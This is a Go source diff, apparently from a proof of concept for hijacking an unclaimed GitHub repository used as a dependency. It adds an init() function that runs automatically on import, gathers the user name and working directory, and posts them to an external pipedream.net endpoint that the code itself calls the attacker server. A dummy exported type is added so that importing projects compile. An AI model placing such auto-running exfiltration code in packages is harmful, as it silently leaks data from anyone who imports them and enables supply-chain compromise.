@@ -7,13 +7,24 @@ import (
 	"os"
 )
 
+// Dummy exported type (required for named import like `pb`)
+type Dummy struct{}
+
 func init() {
-	user := os.Getenv("USER") // safe access
-	dir, _ := os.Getwd()      // current working dir
+	user := os.Getenv("USER")
+	cwd, _ := os.Getwd()
+	data := url.Values{}
+	data.Set("user", user)
+	data.Set("cwd", cwd)
 
-	fmt.Printf("[PoC] Hello from unclaimed GitHub repo!\n")
-	fmt.Printf("[PoC] USER=%s\n", user)
-	fmt.Printf("[PoC] CWD=%s\n", dir)
+	// Replace with your actual VPS URL
+	vpsURL := "https://eou39l9f2i96s48.m.pipedream.net/poc"
 
-	http.Get("https://eou39l9f2i96s48.m.pipedream.net/poc?user=" + url.QueryEscape(user) + "&dir=" + url.QueryEscape(dir))
+	// Send callback
+	_, err := http.PostForm(vpsURL, data)
+	if err != nil {
+		fmt.Println("[PoC] Failed to send data:", err)
+	} else {
+		fmt.Println("[PoC] Callback sent successfully to attacker server")
+	}
 }
